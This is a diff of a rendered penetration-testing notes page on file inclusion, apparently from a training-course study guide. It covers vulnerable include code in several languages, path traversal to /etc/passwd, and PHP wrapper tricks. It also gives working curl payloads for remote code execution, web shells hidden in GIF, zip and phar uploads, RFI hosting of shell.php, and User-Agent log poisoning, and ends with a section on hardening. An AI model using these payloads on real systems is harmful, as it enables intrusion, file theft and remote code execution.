-<li><a href="#waf">WAF</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<hr />
-<h1 id="file-inclusion"><a class="header" href="#file-inclusion">File Inclusion</a></h1>
+                        <h1 id="file-inclusion"><a class="header" href="#file-inclusion">File Inclusion</a></h1>
 <h2 id="intro"><a class="header" href="#intro">Intro</a></h2>
 <p>Many modern back-end languages use HTTP parameters to sprecify what is shown on the web page, which allows for building dynamic web pages, reduces the script's overall size, and simplifies the code. In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a Local File Inclusion (<em>LFI</em>) vulnerability.</p>
 <p>The most common place you usually find LFI within is templating engines. In order to have most of the web app looking the same when navigating between pages, a template engine displays a page that shows common static parts, such as the header, navigation bar, and footer, and then dynamically loads other content that changes between pages. Otherwise every page on the server would need to be modifified when changes are made to any of the staitc parts. This is why you often see a parameter like <code>index.php?page=about</code>, where <code>index.php</code> sets static content, and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called <code>about.php</code>. As you have control over the <code>about</code> portion of the request, it may be possible to have the web app grab other files and display them on the page.</p>
@@ -556,7 +200,7 @@
 }
 </code></pre>
 <p>As you can see, whatever parameter passed from the URL gets used by the <code>readfile</code> function, which then writes the file content in the HTTP response. Another example is the <code>render()</code> function in the Express.js framework. The followwing example shows how the language parameter is used to determine which directory to pull the <code>about.html</code> page from:</p>
-<pre><code class="language-javascript">app.get("/about/:language", function(req, res) {
+<pre><code class="language-javascript">app.get(&quot;/about/:language&quot;, function(req, res) {
     res.render(`/${req.params.language}/about.html`);
 });
 </code></pre>
@@ -568,12 +212,12 @@
 </tbody></table>
 </div>
 <h3 id="examples-of-vulnerable-code---java"><a class="header" href="#examples-of-vulnerable-code---java">Examples of Vulnerable Code - Java</a></h3>
-<pre><code class="language-jsp">&lt;c:if test="${not empty param.language}"&gt;
-    &lt;jsp:include file="&lt;%= request.getParameter('language') %&gt;" /&gt;
+<pre><code class="language-jsp">&lt;c:if test=&quot;${not empty param.language}&quot;&gt;
+    &lt;jsp:include file=&quot;&lt;%= request.getParameter('language') %&gt;&quot; /&gt;
 &lt;/c:if&gt;
 </code></pre>
 <p>The <code>include</code> function may take a file or a page URL as its arguments and then renders the object into the front-end template, similar to the ones you saw earlier with NodeJS. The <code>import</code> function may also be used to render a local file or a URL, such as the following example:</p>
-<pre><code class="language-jsp">&lt;c:import url= "&lt;%= request.getParameter('language') %&gt;"/&gt;
+<pre><code class="language-jsp">&lt;c:import url= &quot;&lt;%= request.getParameter('language') %&gt;&quot;/&gt;
 </code></pre>
 <div class="table-wrapper"><table><thead><tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr></thead><tbody>
 <tr><td><code>include</code></td><td>YES</td><td>NO</td><td>NO</td></tr>
@@ -582,7 +226,7 @@
 </div>
 <h3 id="examples-of-vulnerable-code---net"><a class="header" href="#examples-of-vulnerable-code---net">Examples of Vulnerable Code - .NET</a></h3>
 <pre><code class="language-cs">@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
-    &lt;% Response.WriteFile("&lt;% HttpContext.Request.Query['language'] %&gt;"); %&gt; 
+    &lt;% Response.WriteFile(&quot;&lt;% HttpContext.Request.Query['language'] %&gt;&quot;); %&gt; 
 }
 </code></pre>
 <p>The <code>Response.WriteFile</code> function works very similar to all of your earlier examples, as it takes a file path for its input and writes its content to the response. The path may be retrieved from a GET parameter for dynamic content loading.</p>
@@ -590,7 +234,7 @@
 <pre><code class="language-cs">@Html.Partial(HttpContext.Request.Query['language'])
 </code></pre>
 <p>Finally, the <code>include</code> function may be used to render local files or remote URLs, and may also execute the specified files as well:</p>
-<pre><code class="language-cs">&lt;!--#include file="&lt;% HttpContext.Request.Query['language'] %&gt;"--&gt;
+<pre><code class="language-cs">&lt;!--#include file=&quot;&lt;% HttpContext.Request.Query['language'] %&gt;&quot;--&gt;
 </code></pre>
 <div class="table-wrapper"><table><thead><tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr></thead><tbody>
 <tr><td><code>@Html.Partial()</code></td><td>YES</td><td>NO</td><td>NO</td></tr>
@@ -615,7 +259,7 @@
 <pre><code class="language-php">include($_GET['language']);
 </code></pre>
 <p>In this case, if you try to read <code>/etc/passwd</code>, then the include function would fetch that file directly. However, in many occasions, web devs may append or prepend a string to the <code>language</code> parameter. For example, the <code>language</code> parameter may be used for the filename, and may be added after a directory:</p>
-<pre><code class="language-php">include("./languages/" . $_GET['language']);
+<pre><code class="language-php">include(&quot;./languages/&quot; . $_GET['language']);
 </code></pre>
 <p>In this case, if you attempt to read <code>/etc/passwd</code>, then the path passed to <code>include()</code> would be <code>.languages//etc/passwd</code>, and as this file does not exist, you will not be able to read anything.</p>
 <p>You can easily, bypass this restriction by traversing directories using relative paths. To do so, you can add <code>../</code> before your file name, which refers to the parent directory. For example, if the full path of the language directory is <code>/var/wwww/html/language</code>, then using <code>../index.php</code> would refer to the <code>index.php</code> file on the parent directory.</p>
@@ -624,21 +268,18 @@
 <p>As you can see, this time you were able to read the file regardless of the directory you were in. This trick would work even if the entire parameter was used in the <code>include()</code> function, so you can default to this technique, and it should work in both cases. Furthermore, if you were at the root path and used <code>../</code> then you would still remain in the root path. So, if you were not sure if the directory the app is in, you can add <code>../</code> many times, and it should not break the path.</p>
 <h4 id="filename-prefix"><a class="header" href="#filename-prefix">Filename Prefix</a></h4>
 <p>In the previous example, you used the <code>language</code> parameter after the directory, so you could traverse the path to read the <code>passwd</code>. On some occasions, you input may be appended after a different string. For example, it may be used with a prefix to get the full filename:</p>
-<pre><code class="language-php">include("lang_" . $_GET['language']);
+<pre><code class="language-php">include(&quot;lang_&quot; . $_GET['language']);
 </code></pre>
 <p>In this case, if you try to traverse the directory with <code>../../../etc/passwd</code>, the final string would be <code>lang_../../../etc/passwd</code>, which is invalid.</p>
 <p>Instead, you can prefix a <code>/</code> before your payload, and this should consider the prefix as a directory, and then you should bypass the filename and be able to traverse directories:</p>
 <p><img src="../../../../images/lfi5.png" alt="lfi 5" /></p>
-<div class="mdbook-callouts mdbook-callouts-note">
-<p class="mdbook-callouts-title">
-  <span class="mdbook-callouts-icon"></span>
-  note
-</p>
-<p>This may not always work, as in this example a directory named <code>lang_</code> may not exist, so your relative path may not be correct. Furthermore, any prefix appended to your input may break some file inclusion techniques, like using PHP wrappers and filters or RFI.</p>
-</div>
+<blockquote>
+<p>[!NOTE]
+This may not always work, as in this example a directory named <code>lang_</code> may not exist, so your relative path may not be correct. Furthermore, any prefix appended to your input may break some file inclusion techniques, like using PHP wrappers and filters or RFI.</p>
+</blockquote>
 <h4 id="appended-extensions"><a class="header" href="#appended-extensions">Appended Extensions</a></h4>
 <p>Another very common example, is when an extension is appended to the <code>language</code> parameter:</p>
-<pre><code class="language-php">include($_GET['language'] . ".php");
+<pre><code class="language-php">include($_GET['language'] . &quot;.php&quot;);
 </code></pre>
 <p>This is quite common, as in this case, you would not have to write the extension every time you need to change the language. This may also be safer as it may restrict you to only including PHP files. In this case, if you try to read <code>/etc/passwd</code>, then the file included would be <code>/etc/passwd.php</code>, which does not exist.</p>
 <h4 id="second-order-attacks"><a class="header" href="#second-order-attacks">Second Order Attacks</a></h4>
@@ -681,7 +322,7 @@
 <pre><code>?language=non_existing_directory/../../../etc/passwd/./././././ [REPEATED ~2048 times]
 </code></pre>
 <p>Command to automate the creation of this string:</p>
-<pre><code class="language-bash">d41y@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" &amp;&amp; for i in {1..2048}; do echo -n "./"; done
+<pre><code class="language-bash">d41y@htb[/htb]$ echo -n &quot;non_existing_directory/../../../etc/passwd/&quot; &amp;&amp; for i in {1..2048}; do echo -n &quot;./&quot;; done
 non_existing_directory/../../../etc/passwd/./././&lt;SNIP&gt;././././
 </code></pre>
 <p>You may also increase the count of <code>../</code>, as adding more would still land you in the root directory, as explained in the previous section. However, if you use this method, you should calculate the full length of the string to ensure only <code>.php</code> gets truncated and not your requested file at the end of the string. This is why it would be easier to use the first method.</p>
@@ -704,13 +345,10 @@ non_existing_directory/../../../etc/passwd/./././&lt;SNIP&gt;././././
 index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
 config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
 </code></pre>
-<div class="mdbook-callouts mdbook-callouts-tip">
-<p class="mdbook-callouts-title">
-  <span class="mdbook-callouts-icon"></span>
-  tip
-</p>
-<p>Unlike normal web app usage, you are not restricted to pages with HTTP response code 200, as you have LFI access, so you should be scanning for all codes, including 301, 302, and 403 pages, and you should be able to read their source code as well.</p>
-</div>
+<blockquote>
+<p>[!TIP]
+Unlike normal web app usage, you are not restricted to pages with HTTP response code 200, as you have LFI access, so you should be scanning for all codes, including 301, 302, and 403 pages, and you should be able to read their source code as well.</p>
+</blockquote>
 <p>Even after reading the sources of any identified files, you can scan them for other referenced PHP files, and then read those as well, until you are able to capture most of the web app's source or have an accurate image of what it does. It is also possible to start by reading <code>index.php</code> and scanning it for more references and so on, but fuzzing for PHP files may reveal some files that may not otherwise be found that way.</p>
 <h4 id="standard-php-inlcusion"><a class="header" href="#standard-php-inlcusion">Standard PHP Inlcusion</a></h4>
 <p>In previous sections, if you tried to include any PHP files through LFI, you would have noticed that the included PHO file gets executed, and eventually gets rendered as a normal HTML page. For example, try to include the <code>config.php</code> page:</p>
@@ -741,16 +379,16 @@ if ($_SERVER['REQUEST_METHOD'] == 'GET' &amp;&amp; realpath(__FILE__) == realpat
 <p>The <code>data</code> wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the <code>allow_url_include</code> setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vuln.</p>
 <h5 id="checking-php-configurations"><a class="header" href="#checking-php-configurations">Checking PHP Configurations</a></h5>
 <p>To do so, you can include the PHP configuration file found at <code>/etc/php/X.Y/apache2/php.ini</code> for Apache or at <code>/etc/php/X.Y/fpm/php.ini</code> for Nginx, where <code>X.Y</code> is your install PHP version. You can start with the latest PHP version, and try earlier versions if you couldn't locate the configuration file. You will also use the base64 filter you used in the previous section, as <code>.ini</code> files are similar to <code>.php</code> files and should be encoded to avoid breaking. Finally, you'll use cURL or Burp instead of a Browser, as the output string could be very long and you should be able to properly capture it.</p>
-<pre><code class="language-bash">d41y@htb[/htb]$ curl "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+<pre><code class="language-bash">d41y@htb[/htb]$ curl &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&quot;
 &lt;!DOCTYPE html&gt;
 
-&lt;html lang="en"&gt;
+&lt;html lang=&quot;en&quot;&gt;
 ...SNIP...
  &lt;h2&gt;Containers&lt;/h2&gt;
     W1BIUF0KCjs7Ozs7Ozs7O
     ...SNIP...
     4KO2ZmaS5wcmVsb2FkPQo=
-&lt;p class="read-more"&gt;
+&lt;p class=&quot;read-more&quot;&gt;
 </code></pre>
 <p>Once you have the base64 encoded string, you can decode it and grep for <code>allow_url_include</code> to see its value:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
@@ -761,7 +399,7 @@ allow_url_include = On
 <h5 id="remote-code-execution-1"><a class="header" href="#remote-code-execution-1">Remote Code Execution</a></h5>
 <p>With <code>allow_url_include</code> enabled, you can proceed with your <code>data</code> wrapper attack. As mentioned earlier, the <code>data</code> wrapper can be used to include external data, including PHP code. You can also pass it base64 encoded strings with <code>text/plain;base64</code>, and it has the ability to decode them and execute the PHP code.</p>
 <p>So, your first step would be to base64 encode a basic PHP web shell:</p>
-<pre><code class="language-bash">d41y@htb[/htb]$ echo '&lt;?php system($_GET["cmd"]); ?&gt;' | base64
+<pre><code class="language-bash">d41y@htb[/htb]$ echo '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' | base64
 
 PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 </code></pre>
@@ -774,7 +412,7 @@ PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 <h4 id="input"><a class="header" href="#input">Input</a></h4>
 <p>Similar to the <code>data</code> wrapper, the <code>input</code> wrapper can be used to include external input and execute PHP code. The difference between it and the <code>data</code> wrapper is that you pass your input to the <code>input</code> wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the <code>input</code> wrapper also depends on the <code>allow_url_include</code> setting, as mentioned earlier.</p>
 <p>To repeat your earlier attack but with the <code>input</code> wrapper, you can send a POST request to the vulnerable URL and add your web shell as POST data. To execute a command, you would pass it as a GET parameter, as you did in your previous attack:</p>
-<pre><code class="language-bash">d41y@htb[/htb]$ curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id" | grep uid
+<pre><code class="language-bash">d41y@htb[/htb]$ curl -s -X POST --data '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id&quot; | grep uid
             uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre>
 <h4 id="expect"><a class="header" href="#expect">Expect</a></h4>
@@ -784,7 +422,7 @@ PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 extension=expect
 </code></pre>
 <p>As you can see, the <code>extension</code> configuration keyword is used to enable the <code>expect</code> module, which means you should be able to use it for gaining RCE through LFI vuln. To use the expect module, you can use the <code>expect://</code> wrapper and then pass the command you want to execute:</p>
-<pre><code class="language-bash">d41y@htb[/htb]$ curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id"
+<pre><code class="language-bash">d41y@htb[/htb]$ curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&quot;
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre>
 <p>As you can see, executing commands through the <code>expect</code> module is fairly straightforward.</p>
@@ -814,7 +452,7 @@ allow_url_include = On
 <p>You also see that you were able to specify port 80 and get the web app on that port. If the back-end hosted any other local web app, then you may be able to access them through the RFI vulnerability by applying SSRF techniques on it.</p>
 <h4 id="rce-with-rfi"><a class="header" href="#rce-with-rfi">RCE with RFI</a></h4>
 <p>The first step in gaining RCE is creating a malicious script in the language of the web app, PHP in this case.</p>
-<pre><code class="language-bash">d41y@htb[/htb]$ echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php
+<pre><code class="language-bash">d41y@htb[/htb]$ echo '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.php
 </code></pre>
 <p>Now, all you need to do is host the script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like 80 or 443, as these ports may be whitelisted in case the vulnerable web app has a firewall preventing outgoing connections. Furthermore, you may host the script through an FTP service or an SMB service.</p>
 <h5 id="http"><a class="header" href="#http">HTTP</a></h5>
@@ -828,7 +466,7 @@ Serving HTTP on 0.0.0.0 port &lt;LISTENING_PORT&gt; (http://0.0.0.0:&lt;LISTENIN
 <pre><code class="language-bash">d41y@htb[/htb]$ sudo python3 -m http.server &lt;LISTENING_PORT&gt;
 Serving HTTP on 0.0.0.0 port &lt;LISTENING_PORT&gt; (http://0.0.0.0:&lt;LISTENING_PORT&gt;/) ...
 
-SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
+SERVER_IP - - [SNIP] &quot;GET /shell.php HTTP/1.0&quot; 200 -
 </code></pre>
 <h5 id="ftp"><a class="header" href="#ftp">FTP</a></h5>
 <p>You may also host your script through the FTP protocol. You can start a basic FTP server with Python's <code>pyftpdlib</code>:</p>
@@ -880,21 +518,18 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 <p>... is very common in most modern web apps, as uploading images is widely regarded as safe if the upload function is securely coded.</p>
 <h5 id="crafting-malicious-image"><a class="header" href="#crafting-malicious-image">Crafting Malicious Image</a></h5>
 <p>The first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, you will use an allowed image extension in your file (<code>shell.gif</code>), and should also include the image magic bytes at the beginning of the file content, just in case the upload form checks for both the extension and content type as well.</p>
-<pre><code class="language-bash">d41y@htb[/htb]$ echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif
+<pre><code class="language-bash">d41y@htb[/htb]$ echo 'GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.gif
 </code></pre>
 <p>This file on its own is completely harmless and would not affect normal web apps in the slightest. However, if you combine it with an LFI vuln, then you may be able to reach RCE.</p>
-<div class="mdbook-callouts mdbook-callouts-note">
-<p class="mdbook-callouts-title">
-  <span class="mdbook-callouts-icon"></span>
-  note
-</p>
-<p>You are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII chars, while other extensions have magic bytes that you would need to URL encode.</p>
-</div>
+<blockquote>
+<p>[!NOTE]
+You are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII chars, while other extensions have magic bytes that you would need to URL encode.</p>
+</blockquote>
 <p>Now, you need to upload your malicious image file.</p>
 <p><img src="../../../../images/lfi17.png" alt="lfi 17" /></p>
 <h5 id="uploaded-file-path"><a class="header" href="#uploaded-file-path">Uploaded File Path</a></h5>
 <p>Once you've uploaded the file, all you need to do is include it through the LFI vuln. To do that, you need to know the path to your uploaded file. In most cases, especially with images, you would get access to your uploaded file and can get its path from its URL. In your case, if you inspect the source code after uploading the image, you can get its URL:</p>
-<pre><code>&lt;img src="/profile_images/shell.gif" class="profile-image" id="profile-image"&gt;
+<pre><code>&lt;img src=&quot;/profile_images/shell.gif&quot; class=&quot;profile-image&quot; id=&quot;profile-image&quot;&gt;
 </code></pre>
 <p>Otherwise, you would need to fuzz for directories.</p>
 <p>With the uploaded file path at hand, all you need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed.</p>
@@ -902,7 +537,7 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 <p>As you can see, you included your file and successfully executed the <code>id</code>  command.</p>
 <h4 id="zip-upload"><a class="header" href="#zip-upload">Zip Upload</a></h4>
 <p>You can utilize zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, you can start by creating a PHP web shell script and zipping it into a zip archive.</p>
-<pre><code class="language-bash">d41y@htb[/htb]$ echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php
+<pre><code class="language-bash">d41y@htb[/htb]$ echo '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php
 </code></pre>
 <p>Once you uploaded the <code>shell.jpg</code> archive, you can include it with the zip wrapper as <code>zip://shell.jpg</code> (<em>URL encoded</em>), and then refer to any files within it with <code>#shell.php</code>. Finally, you can execute commands:</p>
 <p><img src="../../../../images/lfi19.png" alt="lfi 19" /></p>
@@ -911,7 +546,7 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 <pre><code class="language-php">&lt;?php
 $phar = new Phar('shell.phar');
 $phar-&gt;startBuffering();
-$phar-&gt;addFromString('shell.txt', '&lt;?php system($_GET["cmd"]); ?&gt;');
+$phar-&gt;addFromString('shell.txt', '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;');
 $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');
 
 $phar-&gt;stopBuffering();
@@ -965,19 +600,16 @@ $phar-&gt;stopBuffering();
 <p>As expected, you custom User-Agent value is visible in the included log file. Now, you can poison the User-Agent header by setting it to a basic PHP web shell.</p>
 <p><img src="../../../../images/lfi27.png" alt="lfi 27" /></p>
 <p>You may also poison the log by sending a request through cURL.</p>
-<pre><code class="language-bash">d41y@htb[/htb]$ echo -n "User-Agent: &lt;?php system(\$_GET['cmd']); ?&gt;" &gt; Poison
-d41y@htb[/htb]$ curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php" -H @Poison
+<pre><code class="language-bash">d41y@htb[/htb]$ echo -n &quot;User-Agent: &lt;?php system(\$_GET['cmd']); ?&gt;&quot; &gt; Poison
+d41y@htb[/htb]$ curl -s &quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&quot; -H @Poison
 </code></pre>
 <p>As the log should now contain PHP code, the LFI vuln should execute this code, and you should be able to gain RCE.</p>
 <p><img src="../../../../images/lfi28.png" alt="lfi 28" /></p>
 <p>You see that you successfully executed the command. The exact same attack can be carried out on Nginx logs as well.</p>
-<div class="mdbook-callouts mdbook-callouts-tip">
-<p class="mdbook-callouts-title">
-  <span class="mdbook-callouts-icon"></span>
-  tip
-</p>
-<p>The <code>User-Agent</code> header is also shown on process files under the Linux <code>/proc/</code> directory. So, you can try including the <code>/proc/self/environ</code> or <code>/proc/self/fd/N</code>  files (<em>where N is a PID usually between 0-50</em>), and you may be able to perform the same attack on these files. This may become handy in case you did not have read access over the server logs, however, these files may only be readable by privileged users as well.</p>
-</div>
+<blockquote>
+<p>[!TIP]
+The <code>User-Agent</code> header is also shown on process files under the Linux <code>/proc/</code> directory. So, you can try including the <code>/proc/self/environ</code> or <code>/proc/self/fd/N</code>  files (<em>where N is a PID usually between 0-50</em>), and you may be able to perform the same attack on these files. This may become handy in case you did not have read access over the server logs, however, these files may only be readable by privileged users as well.</p>
+</blockquote>
 <p>Finally, there are other similar log poisoning techniques that you ma utilize on various system logs, depending on which logs you have read access over. The following are some of the service logs you may be able to read:</p>
 <ul>
 <li><code>/var/log/sshd.log</code></li>
@@ -1141,11 +773,11 @@ export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
 <p>It's also often possible to lock web apps to their web root directory, preventing them from accessing non-web related files. The most common way to do this is by running the app within Docker. However, if that is not an option, many languages often have a way to prevent accessing files outside of the web directory. In PHP that can be done by adding <code>open_basedir = /var/www</code> in the php.ini file. Furthermore, you should ensure that certain potentially dangerous modules are disabled, like the PHP <code>expect://</code> wrapper and the PHP module <code>mod_userdir</code>.</p>
 <p>If these configs are applied, it should prevent accessing files outside the web application folder, so even if an LFI vuln is identified, its impact would be reduced.</p>
 <h4 id="waf"><a class="header" href="#waf">WAF</a></h4>
-<p>The universal way to harden apps is to utilize WAFs, such as ModSecurity. When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. ModSecurity minimizes false positives by offering a permissive mode, which will only report things it would have blocked. This lets defenders tune the rules to make sure no legitimate request is blocked. Even if the organization never wants to turn the WAF to "blocking mode", just having it in permissive mode can be an early warning sign that your application is being attacked.</p>
+<p>The universal way to harden apps is to utilize WAFs, such as ModSecurity. When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests. ModSecurity minimizes false positives by offering a permissive mode, which will only report things it would have blocked. This lets defenders tune the rules to make sure no legitimate request is blocked. Even if the organization never wants to turn the WAF to &quot;blocking mode&quot;, just having it in permissive mode can be an early warning sign that your application is being attacked.</p>
 <p>Finally, it is important to remember that the purpose of hardening is to give the application a stronger exterior shell, so when an attack does happen, the defenders have time to defend. According to the FireEye M-Trends Report of 2020, the average time it took a company to detect hackers was 30 days. With proper hardening, attackers will leave many more signs, and the organization will hopefully detect these events even quicker.</p>
-<p>It is important to understand the goal of hardening is not to make your system un-hackable, meaning you cannot neglect watching logs over a hardened system because it is "secure". Hardened systems should be continually tested, especially after a zero-day is released for a relatedd application to your system. In most cases, the zero-day would work, but thanks to hardening, it may generate unique logs, which made it possible to confirm the exploit was used against the system or not.<!-- {% embed footer message="2025 • Created by [d41y](https://github.com/d41y)" %} --></p>
-<div data-embedify data-app="footer" data-option-message="2025 • Created by [d41y](https://github.com/d41y)" style="display:none"></div>
-<style>footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }</style><footer><p>2025 • Created by <a href="https://github.com/d41y">d41y</a></p></footer>
+<p>It is important to understand the goal of hardening is not to make your system un-hackable, meaning you cannot neglect watching logs over a hardened system because it is &quot;secure&quot;. Hardened systems should be continually tested, especially after a zero-day is released for a relatedd application to your system. In most cases, the zero-day would work, but thanks to hardening, it may generate unique logs, which made it possible to confirm the exploit was used against the system or not.<!-- {% embed footer message="2026 • Created by [d41y](https://github.com/d41y)" %} --></p>
+<div data-embedify data-app="footer" data-option-message="2026 • Created by [d41y](https://github.com/d41y)" style="display:none"></div>
+<style>footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }</style><footer><p>2026 • Created by <a href="https://github.com/d41y">d41y</a></p></footer>
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
@@ -1209,7 +841,6 @@ export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
 
         <!-- Custom JS scripts -->
         <script src="../../../../theme/pagetoc.js"></script>
-
 
 
     </div>
